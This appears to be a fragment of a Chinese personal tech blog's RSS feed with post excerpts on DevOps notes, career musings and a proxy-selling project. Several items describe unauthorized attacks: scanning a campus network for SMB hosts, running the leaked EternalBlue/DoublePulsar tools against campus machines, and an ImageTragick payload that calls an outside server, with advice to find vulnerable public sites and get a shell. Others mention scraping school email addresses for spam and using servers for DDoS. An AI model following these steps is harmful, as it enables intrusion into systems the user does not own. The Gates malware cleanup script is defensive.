+那天我问别人的时候，总结了两点就是，专注和沉淀。L说的是沉淀，Z说的是专注。其实意思都差不多，就是别水，要有干货。专注是沉淀的充分条件，沉淀是专注的必要条件。
+虽然都是二十出头的小伙子，但说的还都很有道理的，比我这个迷茫要强得多。
+记得大一的时候，学长说过要选择自己的方向，可能那个时候他也刚找到自己的方向吧，毕竟找方向挺难的，这么多东西，又没有指南针，找方向谈何容易。
+所以那些没有方向的人，就只能找个热门的行业和岗位，进个培训班，学上几个月，然后面试碰碰运气，混口饭吃。我可不想这样。
+人呐，要知道自己要干什么。
+大学中多涉猎一点，是好事。因为只有这样了，你才能知道到底有哪些方向供你选择，某种意义上的路线矫正？也有可能就是，当你找到某个方向的时候，发现另一个方向自己也喜欢得不得了，然后就跳到那个行业去了。嗯&amp;hellip;虽然听起来像狗熊掰棒子，但是大家都是成年人了，是要对自己的行为负责的，所以，慎重考虑之后的决定，并不是见异思迁。
+至于找工作，就要看你会什么了。写代码的不能去搞设计，做美工的不能来干运维。虽然说不想当厨子的裁缝不是好司机，但不会写代码的程序员是做不了CTO的（认真脸）。 最好的方式是，通过大学四年的积累，找到了自己的方向，然后小小的努力一下，学有小成，然后有些顺利的拿到offer，开始打工之路。最差的方式是，打了四年游戏，啥也不会，毕业证差点混不出来，毕业前慌忙啃了三个月Java，坎坷入职某公司。
+虽然大家都找到了工作，但经历不一样呀。哦对忘了说，经历是人生宝贵的财富。
+唉，我都不知道自己说了什么。大家好，我叫瞎哔哔。</description>
+    </item>
+    
+    <item>
+      <title>校内网安全测试</title>
+      <link>https://wrfly.kfd.me/posts/%E6%A0%A1%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/</link>
+      <pubDate>Tue, 18 Apr 2017 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E6%A0%A1%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/</guid>
+      <description>今天测试了一下学校的内网主机，傻逼学校没做VLAN，光在 10.170.0.0/16 就扫到了 1662 台开着 445 端口的主机:
+➜ ./fmt.sh | wc -l 1662 ➜ ./fmt.sh | grep &amp;#34;Windows 7&amp;#34; | wc -l 451 ➜ ./fmt.sh | grep &amp;#34;Windows 8&amp;#34; | wc -l 378 ➜ ./fmt.sh | grep &amp;#34;Windows 10&amp;#34; | wc -l 788 ➜ ./fmt.sh | grep &amp;#34;Windows XP&amp;#34; | wc -l 40 ➜ ./fmt.sh | grep &amp;#34;Windows 2008&amp;#34; | wc -l 3 ➜ ./fmt.sh | grep &amp;#34;Windows 2008&amp;#34; [*] 10.</description>
+    </item>
+    
+    <item>
+      <title>shadowbroker大杀器</title>
+      <link>https://wrfly.kfd.me/posts/shadowbroker%E5%A4%A7%E6%9D%80%E5%99%A8/</link>
+      <pubDate>Sun, 16 Apr 2017 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/shadowbroker%E5%A4%A7%E6%9D%80%E5%99%A8/</guid>
+      <description>搞了两天，弄出个差不多的套路，漫游了一波校园网。
+环境要求： python2.6 + pywin32 扩展包
+将 windows/lib/ 下对应的的dll目录添加到系统环境变量里面，还要把 pytrch.py 和 _pytrch 都放到python的扩展包里面，否则运行 fb.py 会报错。
+然后运行 fb.py
+两个可用套路：
+Eternalblue + Doublepulsar use Eternalblue 中间按照提示填入相应的IP和端口信息 需要注意的是这里： [*] Mode :: Delivery mechanism *0) DANE Forward deployment via DARINGNEOPHYTE 1) FB Traditional deployment from within FUZZBUNCH [?] Mode [0] : 1 [+] Run Mode: FB 然后一路确定就OK use Doublepulsar [!] Enter Prompt Mode :: Doublepulsar Module: Doublepulsar ==================== Name Value ---- ----- NetworkTimeout 60 TargetIp 10.</description>
+    </item>
+    
+    <item>
+      <title>还是代理</title>
+      <link>https://wrfly.kfd.me/posts/%E8%BF%98%E6%98%AF%E4%BB%A3%E7%90%86/</link>
+      <pubDate>Sun, 02 Apr 2017 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E8%BF%98%E6%98%AF%E4%BB%A3%E7%90%86/</guid>
+      <description>sublimetext的PackageControl连接总是超时，但是手头又没有http的代理，都是用的shadowsocks，然后就要想个办法怎样把socks5代理转换成http代理。
+先是大体搜了一下，解决方案有这两种： - proxychains - tsocks
+但是这两种代理都不复合我的要求，因为他们只能代理一次请求，不会持续listen一个端口，然后提供服务。
+不得已之下，自己&amp;rdquo;写&amp;rdquo;一个吧。
+https://github.com/wrfly/hovers
+其实到后来才搜到，有个老牌的代理软件：privoxy，安装之后，在配置文件里添加 forward-socks5 / 127.0.0.1:1080 . 就可以了。其中127.0.0.1:1080是socks5的代理地址。
+然后在sublime中配置一下： ~/.config/sublime-text-3/Packages/User/Package Control.sublime-settings
+添加：
+&amp;#34;http_proxy&amp;#34;: &amp;#34;localhost:8118&amp;#34; 即可。</description>
+    </item>
+    
+    <item>
+      <title>Linux下Gates病毒</title>
+      <link>https://wrfly.kfd.me/posts/linux%E4%B8%8Bgates%E7%97%85%E6%AF%92/</link>
+      <pubDate>Wed, 22 Mar 2017 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/linux%E4%B8%8Bgates%E7%97%85%E6%AF%92/</guid>
+      <description>今天处理了一个Gates病毒。 病毒表面症状是，创建一个带有 ais 隐藏属性的 /etc/kblockd 文件，无法删除，并且在 /usr/bin/dpkgd/ 目录中创建了lsof netstat ss ps这些二进制文件，在 /tmp 目录下生成 gates.lod 和 moni.lod 两个文件，在 /etc/init.d/ 中创建 selinux 和 DbSecuritySpt ，并向 /etc/rc.d/rc*/ 中注册，其中，/etc/init.d/selinux 启动的是 /usr/bin/bsd-port/getty，还会创建一个隐藏的 /usr/bin/.sshd 文件作为后门。
+看上去很复杂的样子。
+解决脚本如下：
+#!/bin/bash chattr -ais /etc/kblockd #cp /dev/null /etc/kblockd #chmod -x /etc/kblockd rm -f /etc/kblockd pkill .sshd chmod -x /usr/bin/.sshd rm -f /usr/bin/.sshd pkill ^getty rm -rf /usr/bin/bsd-port rm -rf /usr/bin/dpkgd find /etc/rc.d/ -name *selinux -delete find /etc/init.d -name *selinux -delete find /etc/rc.</description>
+    </item>
+    
+    <item>
+      <title>confd笔记</title>
+      <link>https://wrfly.kfd.me/posts/confd%E7%AC%94%E8%AE%B0/</link>
+      <pubDate>Sun, 12 Mar 2017 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/confd%E7%AC%94%E8%AE%B0/</guid>
+      <description>好记性不如烂笔头。
+昨天完成了项目的 etcd + confd + openresty 的反代部分，在这里记录一下。这东西学起来还是有点时间的，文档也说的不明白，没个example可以看。
+etcd 部分 单点etcd启动：
+docker volume create etcd_data docker run -dti --network host \ 	-v etcd_data:/default.etcd \ 	-e ETCD_LISTEN_PEER_URLS=http://10.170.1.31:2380 \ 	-e ETCD_LISTEN_CLIENT_URLS=http://10.170.1.31:2379 \ 	-e ETCD_ADVERTISE_CLIENT_URLS=http://10.170.1.31:2379 \ 	quay.io/coreos/etcd:latest 然后这个 quay.io/coreos/etcd:latest 镜像隔着我国比较远，所以不如用我的镜像 wrfly/etcd pull 的时候会快一点。 （2017-3-12 version: latest）
+confd 配置部分 confd启动的时候需要一些配置：
+backend = &amp;#34;etcd&amp;#34; confdir = &amp;#34;/etc/confd&amp;#34; log-level = &amp;#34;info&amp;#34; watch = true noop = false prefix = &amp;#34;/&amp;#34; scheme = &amp;#34;http&amp;#34; node = [ &amp;#34;1.</description>
+    </item>
+    
+    <item>
+      <title>etcd笔记</title>
+      <link>https://wrfly.kfd.me/posts/etcd%E7%AC%94%E8%AE%B0/</link>
+      <pubDate>Wed, 08 Mar 2017 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/etcd%E7%AC%94%E8%AE%B0/</guid>
+      <description>很早就写的一篇笔记，放在这里充数。
+运行一个最简单的etcd docker run -p 4001:4001 --rm -ti microbox/etcd --name etcd0 API  获取版本
+curl -L http://127.0.0.1:2379/version 获取键值
+curl http://127.0.0.1:2379/v2/keys/message 设置键值
+curl http://127.0.0.1:2379/v2/keys/message -XPUT -d value=&amp;#34;Hello world&amp;#34; curl -X PUT http://127.0.0.1:2379/v2/keys/message?value=&amp;#34;Hello world&amp;#34; curl -X PUT http://127.0.0.1:2379/v2/keys/message?value=&amp;#34;Hello etcd&amp;#34; 删除键
+curl -X DELETE http://127.0.0.1:2379/v2/keys/message 使用TTL
+curl http://127.0.0.1:2379/v2/keys/foo -XPUT -d value=bar -d ttl=5 curl http://127.0.0.1:2379/v2/keys/foo?value=bar&amp;amp;ttl=5 -XPUT 取消TTL
+curl http://127.0.0.1:2379/v2/keys/foo?value=bar&amp;amp;ttl= -XPUT 创建目录
+curl -X PUT http://127.0.0.1:2379/v2/keys/dir1?dir=true curl -X PUT http://127.0.0.1:2379/v2/keys/dir1 -d dir=true 删除目录</description>
+    </item>
+    
+    <item>
+      <title>关于随机</title>
+      <link>https://wrfly.kfd.me/posts/%E5%85%B3%E4%BA%8E%E9%9A%8F%E6%9C%BA/</link>
+      <pubDate>Sun, 05 Mar 2017 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E5%85%B3%E4%BA%8E%E9%9A%8F%E6%9C%BA/</guid>
+      <description>我们知道电脑生成的数字是伪随机的，掷骰子是随机的。那为什么电脑生成不出一个准确的随机数呢？为什么掷骰子就是随机的呢？
+电脑生成的random number，是以time作为seed，然后生成一个数字，那么，如果我们在电脑计算完成这个数字之前，准确的知道了这个seed，知道电脑生成数字的这个函数，那么我们就知道电脑即将生成的数字。这很容易理解。
+但是。
+为什么我们都相信，掷骰子就是随机的呢？
+我们怎样来定义这个随机呢。
+Quota wikipedia:
+ 随机性（英语：Randomness）这个词是用来表达目的、动机、规则或一些非科学用法的可预测性的缺失。 一个随机的过程是一个不定因子不断产生的重复过程，但它可能遵循某个概率分布。 术语随机经常用于统计学中，表示一些定义清晰的、彻底的统计学属性，例如缺失偏差或者相关。随机与任意不同，因为“一个变量是随机的”表示这个变量遵循概率分布。而任意在另一方面又暗示了变量没有遵循可限定概率分布。
+ 我的理解是，如果一个事件遵循概率分布，每种事件的可能性都相同，那他则是随机的；如果事件不可预测，不遵循概率分布，那就是任意的。
+所以，掷骰子这件事，真的是随机的吗？
+如果我们在掷骰子的时候准确的知道了投掷的方向，角度，初始投掷面，是不是就可以计算出最终的结果？那这是随机的吗？
+如果一个事件有十个过程，其中一个过程是随机的，另外九个过程是不随机的，那产生的事件结果是随机的吗？不随机的话，就是确定的吗？
+投掷一枚硬币，可能会出现正、反、立三种情况，那这三种情况的概率必然不是一样的，那么为什么我们认为正反是随机的呢？
+如果说是因为投掷时候的角度，初始面，以及投掷力度的不同所产生了一个随机的面，那么只有确保投掷时候各个因素都必须是随机的，才能保证最终产生的结果是随机的，然而这些因素能够保证都是随机的吗？只要有一个条件不随机，那么最终产生的结果就不是随机的，可以这样理解吗？
+再回到抛硬币这件事，如果硬币正反面相同，并且有办法标记，在真空环境下，用相同的力度，角度抛出，那么产生是不是就能确定了呢？再放宽一下条件，硬币正反面不想同，仅有细微差别，在正常环境下，用不同的角度，不同的力度抛出硬币，最终产生的结果是真的随机吗？可不可以理解为，函数的输入是力度和角度，输入是硬币哪个面朝上呢。但是如果我们能够计算出这个力度和角度，是不是就能准确的知道哪个面朝上，是不是可以说，这不是随机的，也不是任意的，而是可预知的？
+那么世界上有什么是随机的呢？是不是全都是伪随机？今天下楼的时候刚好碰见一个同学，这是真的“刚好”吗？真的是随机遇见的吗？会不会是可以预测呢？而你没有办法预测，只是因为你掌握的资源不够？
+那么，未来是随机的吗？是不是在一系列伪随机下的必然？
+最后推荐两个小视频：
+什么是随机的
+什么不是随机的</description>
+    </item>
+    
+    <item>
+      <title>MongoDB常用操作</title>
+      <link>https://wrfly.kfd.me/posts/mongodb%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/</link>
+      <pubDate>Sat, 25 Feb 2017 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/mongodb%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/</guid>
+      <description>官方文档：https://docs.mongodb.com/manual/reference/operator/
+简单  use dbName 切换数据库 db.getCollectionNames() 列出数据库中的集合们 db.collctionName.insert({&amp;quot;name&amp;quot;:&amp;quot;wrfly&amp;quot;,&amp;quot;ID&amp;quot;:&amp;quot;wrfly&amp;quot;,&amp;quot;tags&amp;quot;:[&amp;quot;tag1&amp;quot;,&amp;quot;tag2&amp;quot;,&amp;quot;tag3&amp;quot;]}) 插入数据  查询  db.C.find() 查询全部数据  比较类  db.inventory.find({&amp;quot;ID&amp;quot;:&amp;quot;wrfly&amp;quot;}) 精确查询 ID 为 wrfly 的文档 或者 db.inventory.find( { &amp;quot;ID&amp;quot;: { $eq: &amp;quot;wrfly&amp;quot; } } ) 同理， $eq 还可以换成 $gt (&amp;gt;), $gte (&amp;gt;=), $lt(&amp;lt;), $lte(&amp;lt;=), $ne(!=), $in(在集合中), $nin(不在集合中) db.inventory.find ( { quantity: { $in: [20, 50] } } ) 查找 quantity在20和50之间（大于20，小于50）的数据  逻辑判断类（与或非）  db.inventory.find( { $or: [ { quantity: { $lt: 20 } }, { price: 10 } ] } ) 查询 quantity 小于20或者 price 大于10的数据 db.</description>
+    </item>
+    
+    <item>
+      <title>20170203</title>
+      <link>https://wrfly.kfd.me/posts/20170203/</link>
+      <pubDate>Fri, 03 Feb 2017 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/20170203/</guid>
+      <description>已经好久没有更新博客了，找的借口是工作繁忙和懒。
+半年的实习也已经结束一周了，光阴似箭，这句话很有道理。
+这半年总结起来，有写脚本的活，有写Python开发的活，有写go打补丁的活，还有用go写监控的活。原来DevOps就是因为缺人才产生的一种职业啊，naive了我又。数据库高可用方案也搞了好久，写了一点东西，全放公司wiki上了，希望对别人有用。接手的项目有几个，创造性的东西也有几个，大多数是自己的歪点子，不过效果还不错。
+Docker啊Docker。我离安全的路是越走越远了。
+中间还玩了两个docker提权，也算是给公司提醒了，不过那篇文章终究没有写出来。
+不过也托了docker的福，我的毕设也跟docker相关，代码也多多少少写了一点了，用的是新学的golang。
+半年回了三次学校，一次答辩，一次考试，一次补考。
+半年玩了两次，一次西安，一次南京。
+人啊，是越来越懒了，感觉没有以前那么有干劲儿了。
+每每想到未来的种种，就有点压得我喘不过气，不过，没用。还不如老老实实写代码。
+可是我不甘心做个码农呀。
+可是我还能做点什么。
+我也不知道自己几斤几两。其实我连四层代理，七层代理是啥都不知道。我只知道有个四层，有个七层，而且还没用到。
+我会一点php，会一点python，会一点golang，还会写点shell，centos和ubuntu都会玩，也管理过自己的十台机器，还有公司的几百台机器（其实没啥好管的，无非就是清理磁盘，重启机器，修修文件系统，重装一下docker，再多的，管理一下scaleio？）。有时候都觉得自己low的不行。可是我又觉得自己跟别人不一样。到底哪里不一样呢，我还说不清楚。这就比较尴尬了。
+为什么晚上比白天更有效率？ 因为晚上的时候对白天的碌碌无为感到愧疚。
+比deadline更有力量的是内心的愧疚。
+给毕设起名字也没起好，想做一个靶场，基于docker的，docker里面放漏洞应用。想了半天，竟然叫fc。不知道会不会有人联想起fc2，或者是fuck之类的词儿。
+选择困难。
+代码写了一半，制作那些漏洞应用又得好半天，更别说那些书面工作了。好烦。
+我还有十个小时的视频要录制，真的，我哪里来的勇气浪费时间啊。
+都说博客是分享技术的，我tm却在这里瞎扯淡。希望以后的自己看了现在的自己写的乱七八糟的东西，不会笑话自己。
+就这。</description>
+    </item>
+    
+    <item>
+      <title>校园V6</title>
+      <link>https://wrfly.kfd.me/posts/%E6%A0%A1%E5%9B%ADv6/</link>
+      <pubDate>Sat, 12 Nov 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E6%A0%A1%E5%9B%ADv6/</guid>
+      <description>31-aug-2015，我注册了 xyv6.com 这个域名。我还记得那个中午。
+起因是校园网流量太少，但是学校又不限制IPv6的流量（不知道是政策上还是技术手段上），所以就萌生了用IPv6代理上网的想法。
+其实这个想法的萌芽是用GAE翻墙，然后联想到GAE的IPV6，又联想到shadowsocks，再联想到IPv6服务器。
+恰好那个时候有Github送的学生福利，买了几台DigitalOcean的机器，搭了代理。
+网站是用的现成的ss-panel,当时的界面还没有现在3.0版本好看，几乎所有的售卖ss代理都是这一套。
+后端用的是ss-multi-user版本，好像是叫这个名字，已经记不清了。
+当时就算过一笔账，一台服务器可以开1000个人用，就算只有100个VIP，一个人收他10块钱，也是1000块，1000块能买7,8台机器，利滚利。而且有的机器按年买的话非常便宜。况且当时还有DigitalOcean的100刀优惠券，无本万利的感觉。（可是到最后也没有超过80个VIP用户&amp;hellip;）
+沸沸扬扬的开张了。
+当时还在情人坑思考过怎么支付，先是用的淘宝开店，让用户拍下之后联系旺旺，大约卖了几单吧，太麻烦了，不过还是很开心的。虽然是几十块钱，但对我这种穷屌丝来说就是几个月的话费啊！
+后来觉得页面难看，就改了配色，显得不是那么难看。
+还从网上找了一个logo。哈哈哈哈。
+当时推广是在校内bbs推广的，效果还算可以，不过就是有些小白啥也不懂，很无语。
+9-17的时候，注册用户过了600。
+10-19的时候，注册用户有1978个。
+当时还增加了一些小功能，比如离线下载。用户提交一个URL，每台节点的后台都有个job去拿这个下载任务，然后利用服务器的高带宽去下载，大概迅雷也是这个套路？或者他们有更牛逼的资源吧。
+还增加了支付宝支付的接口。当时这个接口我可是研究了好几天，一点也不会PHP，因为穷，硬是做出了扫码支付。想想自己当时也是蛮牛逼的，忘记吃饭，忘记睡觉，每天都是加feature，1点之前没有睡过觉。还好当时校园网不断，要是断电断网，那我就gg了。
+每次上线一个功能，都要测试好久，改来改去的，毕竟不会PHP，当时也没系统的学习Python。好在这两门语言都很好上手，容易看懂，而且，不难。
+上线的流程是，本地测试OK了，就上传代码到远程服务器。主服务器为了稳定，都是买的高配置的，当然，也是便宜的。一开始在conoha，妈蛋把我封了，然后是z.com。（又封了）
+发邮件的时候，为了不显得那么low，我还自己设计了邮件页面，设计了slogan，还有主页的版面。
+有天我发现这个logo太平凡，好像是个国外很牛逼的视频播放网站的logo？然后当时谷歌也换新logo了，正好，这个配色很漂亮，抄了一下，就变成校园V6的logo：
+后来用户越来越多，破5000，破8000，到上个月的破1w，倒闭前的1w1。
+看起来都是数字。没有一开始那么激动了已经。
+寒假前想着在寒假里重新设计一下主页，但由于不想学习，寒假之前就把这一套弄完了，包括kf5的客服系统。
+对了，还被封过域名，把我 www.xyv6.com 封了之后，我就把主域名改成xyv6.com，好记，而且短。有时候，短未必是一件坏事哈。
+一开始调教支付宝接口的时候，各种让舍友付款，各种退款。都熄灯了还在弄这个，也是蛮有意思的。
+还曾经利用香港服务器搞过CDN，因为主站访问特别慢，就想自己做CDN加速一下，可是遇到了一些问题，比如莫名其妙登进了别人的账户，也是不容易。
+剩下的日子就比较清闲了，代码基本都搞完了，也没有啥开发任务，就是维护服务器，什么定时重启服务啊之类的，曾经想优化一下python代码，然而并没有成功。
+有些时候就是想起某个功能，就动手写。还有的时候是用户提出需求，然后我写。开发效率也是快，凌晨就能上线。
+不能说我比别人做的好吧，但至少，更人性化了。
+最后名声在外，是因为做了一个邀请的功能，真的很管用～
+对了，还有群发邮件，那次好像是有5000+的用户，然后我就群发邮件通知什么的。还有推广邮件，从学校的库子里扒拉了几千个邮箱，然后群发邮件，sendgrid真的太赞了～
+还增加了实时显示节点网速的功能，增加了一些监控，然而并没有去看监控&amp;hellip;
+好多事情都是拍脑袋想出来的，做出来了，就不再管了。就好像，github上开的那么多repo。
+每天支付宝上能有十块二十快的进账，一个月的收入也有几百块，能支付那些服务器的费用。总的来说，我也没赔。
+还有一件最重要的事，就是前期推广的时候我还印发了一千张广告，其实一千张也没有多少。有个大二的兄弟（当然，我也不认识人家），帮我发了一中午。省下的广告还在校园内到处贴，妈蛋还被一个保安拍照了，说不能贴广告，日狗。
+回首往事啊，好像也没有很多感慨。就是觉得怪可惜的。把鸡蛋放到一个篮子里，篮子摔了，鸡蛋也都碎了。
+现在也没动力去搞了，没有新的功能，没有维护，QQ群也是几天看一次，还那么多发广告的。QQ群的人数一直没破300，微博的粉丝也到了321止步。真的结束了。
+不过我很开心能做出这样一件事情，让自己没有碌碌无为，能赚些小钱充充话费，给女朋友买点东西。还学到了不少运维的经验。还用这些服务器D过别人hhhh
+自己的付出，得到了别人的感谢，真的是一件，非常非常非常快乐的事。
+向自由致敬。
+校园V6也许不会再开放了，因为我不确定还有没有这样的时间去做，我也不能说我失败了，只能说自己没有用心，或者懒惰。备份的数据放在同一台机器上，我也不知道自己是咋想的hhh。
+虽然积累的一些脚本没了，不过经验还在。我还在。
+再也不会有人注册了。
+忽然想开放源码了。
+好。就这么做了。
+ 以后数据库要异地容灾。 卖ss没有你想象中那么赚钱。 有好用户，也有坏用户。但大多都是好的。 防止薅羊毛。 得到别人的认可是很重要的。 成就感源自于*你*的成就。 很多事情没有你想象中那么难，着手去做就好了。 行动力是第一要素。  平台构架  主节点： &amp;ndash; Mysql（存储用户数据） &amp;ndash; Nginx（Web服务） &amp;ndash; Shadowsocks（运行服务，更新用户数据，更新用户套餐） &amp;ndash; Cron定时任务（月底清空免费用户流量数据，每小时备份，每天压缩备份数据[待添加：发送备份sql文件到邮箱]，定时重启ss服务）</description>
+    </item>
+    
+    <item>
+      <title>logrotate和cron</title>
+      <link>https://wrfly.kfd.me/posts/logrotate%E5%92%8Ccron/</link>
+      <pubDate>Thu, 21 Jul 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/logrotate%E5%92%8Ccron/</guid>
+      <description>来公司实习了四天了，遇到了一些大大小小的问题，写脚本遇到的就不详细说了，说一下定时任务和logrotate（日志轮回）。
+两篇文章介绍logrotate：http://articles.slicehost.com/2010/6/30/understanding-logrotate-on-ubuntu-part-1
+http://articles.slicehost.com/2010/6/30/understanding-logrotate-on-ubuntu-part-2
+说的很详细，具体文件可以参考 /etc/logrotate.d/ 目录下的内容。
+给出一个范本：
+/var/log/test/*.log { hourly rotate 4 missingok size 10M notifempty compress create } 从/var/log/test/目录下查找所有的以.log结尾的文件，每小时轮回一次，保存最近的四个，如果文件不存在也OK，限定大小是超过10M的文件，这里要注意的是，如果文件大小已经超过10M了，那下次logrotate运行的时候，就会忽略上面的hourly，直接rotate，notifempty的意思是，如果文件是空的，则不进行rotate，默认情况是进行的，可以查看man手册查阅详细的说明。压缩，并创建一个新的空文件，防止依赖日志文件的应用报错。
+还需要把logrotate放到cron.hourly目录下，这样配置的hourly才会生效。
+还要说的是，可以使用logrotate -f来强制执行轮回。
+在这里实习很好玩，真的有很多事情可以做。</description>
+    </item>
+    
+    <item>
+      <title>一点小工作</title>
+      <link>https://wrfly.kfd.me/posts/%E4%B8%80%E7%82%B9%E5%B0%8F%E5%B7%A5%E4%BD%9C/</link>
+      <pubDate>Wed, 06 Jul 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E4%B8%80%E7%82%B9%E5%B0%8F%E5%B7%A5%E4%BD%9C/</guid>
+      <description>前一段日子反代的谷歌被墙了，所以，不得不换个新的域名，而且这个域名还不能直接被打开（被确认为谷歌），所以，就耍了一点小聪明：
+valid_referers kfd.me *.kfd.me server_names ~\.google\. ~\.baidu\.; if ($invalid_referer) { rewrite ^/ http://kfd.me; } 算是做了一点小小的工作，而且还挺管用的。可惜了以前每天几千UV的日子，现在只有几十了。
+首先定义了一些Refer，然后服务其判断如果来源不是这些的话，就会返回到我的主站，不知道gov的那些爬虫会不会继续搞我，就先这样吧。
+还有一些小东西：
+sort -u -t &amp;#39;,&amp;#39; -k2,2 data 这条关于sort的命令，用来以文件的第二个字段（字段之间用‘，’分隔）排序并去重。超级好用！
+之所以会用到这条命令，是我这几天在搞一些用户名密码相关的事情，以后的日子还算清闲，没有别的事情，就研究用户名和密码了。
+还有一个小脚本，争取明天写个框架，是一个Telegram的机器人，放到VPS上，当监控来用。
+偷懒了好久，该活动活动了。</description>
+    </item>
+    
+    <item>
+      <title>从iso到docker</title>
+      <link>https://wrfly.kfd.me/posts/%E4%BB%8Eiso%E5%88%B0docker/</link>
+      <pubDate>Mon, 20 Jun 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E4%BB%8Eiso%E5%88%B0docker/</guid>
+      <description>一直想找一个从iso镜像到docker镜像的方法。
+然而，
+找不到。
+原来谷歌也有搜不到的东西啊，所以，我就写了这一篇文章。啊，也有可能是我没搜到，不代表别人搜不到。也有可能这种方法早就存在了，只是我不知道（也没人告诉我啊～）。
+啰嗦完毕。
+文件系统 Linux的文件系统比较有趣，感兴趣的话可以man hier一下，会有整个文件系统的介绍，比如/etc是配置文件目录，/dev是设备文件目录，这里需要注意的是这几个目录：
+ /proc /sys /run /dev  这几个目录都是系统启动时自动生成的，他们虽然也属于文件系统的一部分，但是他们是不确定的。也就是说，我们每次开机这些都会变。
+所以下一步打包文件系统的时候就可以无视他们。
+从虚拟机迁移所有文件 http://www.aboutdebian.com/tar-backup.htm
+先贴一个网址，这上面那介绍了怎样用tra打包文件系统。
+具体的命令上面也说的很清楚，我改了一下：
+tar -zcpf /tmp/fullbackup.tar.gz --directory=/ \ --exclude=proc --exclude=sys --exclude=dev \ --exclude=run --exclude=boot --exclude=tmp . 这样就不会包括那些没用的文件了。
+去掉boot的原因是，docker不需要boot。
+打包后的结果如下：
+其中镜像是pentesterlab的shellshock，iso文件也是二十多兆。
+docker import 把打包好的文件搞出来之后，就可以导入到docker了。
+导出的方法有很多啊，挂载一个数据卷（再从别的虚拟机导出来），如果不安装增强功能的话，如果不嫌麻烦安装了增强功能，还可以直接复制到文件夹；或者最简单的，从80端口下载下来，再或者sshfs，再或者用nc什么的，实在不行写个脚本也能传出来的。
+然后，我们得到了这个压缩包，直接导入就好了：
+然后就可以运行啦:
+或者从这个基础镜像修修改改（dockerfile），也可以直接在压缩的文件系统中修改，然后再导入一遍:
+这种方法适用于所有镜像，不过，有一个很严重的问题，就是如果镜像很大的话，push到docker hub上的时候会很慢，除了用第三方的docker registry或者自己搭建，还没想到别的方法（挂代理也是很慢……）。
+Later 以后想做一批关于web安全的docker基础镜像，或者从exploit-db上面找一些有漏洞的app，然后做成docker。
+不知道去了Daocloud有没有实习生福利，比如，账户升级为专业版？hhhh
+很有趣。</description>
+    </item>
+    
+    <item>
+      <title>DaoCloud API CLI Tool</title>
+      <link>https://wrfly.kfd.me/posts/daocloud-api-cli-tool/</link>
+      <pubDate>Sat, 21 May 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/daocloud-api-cli-tool/</guid>
+      <description>这段时间利用 DaoCloud API 写了一个CLI的工具。
+https://github.com/wrfly/docker/tree/master/daocloud_api
+代码在上面。
+拖了好久才写完，好累。。
+用shell写东西就是比较麻烦，不如Python好用。
+题外话：
+完成一件作品当然是很开心的，不过考虑到我是否能够顺利毕业，心情突然就不美丽了。
+没看书，没学Python，没学车，没练字，没跑步。
+也不知道我的时间都去哪儿了，好像每天过得恍恍惚惚的。
+好像看不到未来，是因为束缚太多吗？有时候我会想，如果毕不了业会怎样，拿不到学位证，大学四年就算白念了吗？可是让我学一些根本不感兴趣的东西，做一些完全无聊的工作，整个人都好难受。我也只能拿这些理由来敷衍自己，自欺欺人？算不算？
+不知道怎样解决这些问题，连个倾诉的人都没有。
+谁会站在你的立场为你着想呢？他们连自己都顾不过来，何谈关心别人。
+纠结，优柔寡断，这是我最大的缺点。
+哦对了，还有拖延。
+搪塞自己，说大不了不毕业，可是谁不想毕业呢，不毕业找不到工作怎么办，连自己都养活不了啊。可是强要我做哪些不喜欢的事情，还不如让我去养猪。写个毛的嗅探器，分析个毛的二进制代码，我连汇编都不会的好吗。我只想搭积木，积木用什么做的我根本不关心也不想去关心。
+人跟人也不能比。但我也不承认我比他们差啊。
+是不是每个人都活的这么累。
+我想知道未来的我有多强大。
+Dark time, and lazy day.</description>
+    </item>
+    
+    <item>
+      <title>ImageMagick漏洞利用</title>
+      <link>https://wrfly.kfd.me/posts/imagemagick%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</link>
+      <pubDate>Sat, 07 May 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/imagemagick%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</guid>
+      <description>写在最前面：关于漏洞的详细信息都在这儿： https://imagetragick.com/ 加个https我估计也是为了嘲讽，醉。
+话说我反应好慢。
+刚测试成功了就尴尬了一回。
+然后琢磨怎么getshell。
+然后。
+如下：
+测试服务器是否存在漏洞： 创建一个文件，叫他 e.png 吧：
+➜ cat e.png push graphic-context viewbox 0 0 640 480 fill &amp;#39;url(http://23.23.23.23:8000/)&amp;#39; pop graphic-context 其中23.23.23.23是你的服务器IP，然后在上面开一个迷你的web服务器：python -m SimpleHTTPServer，默认端口就是8000，如果有其他业务在8000端口跑。还请加个端口参数（python -m SimpleHTTPServer 8989），记得上面的e.png也改一下。
+在服务器上监听好了之后，就可以上传图片了，哦对了，首先做的应该是找一些能上传图片的站，比如，在线图片转换（Google Hacking）。
+其实可以在本地先测试一下：convert e.png o.jpg，如果服务器那边有访问请求（GET），那就说明你本地是存在漏洞的。
+然后如果你找到了一个可以上传图片并且可以执行代码的网站，那么恭喜你，下一步就可以测试getshell了。
+Getshell 利用执行命令这一点，可以做很多事，创建文件，删除文件，移动文件，乱七八糟，我只是利用了一个shell而已。
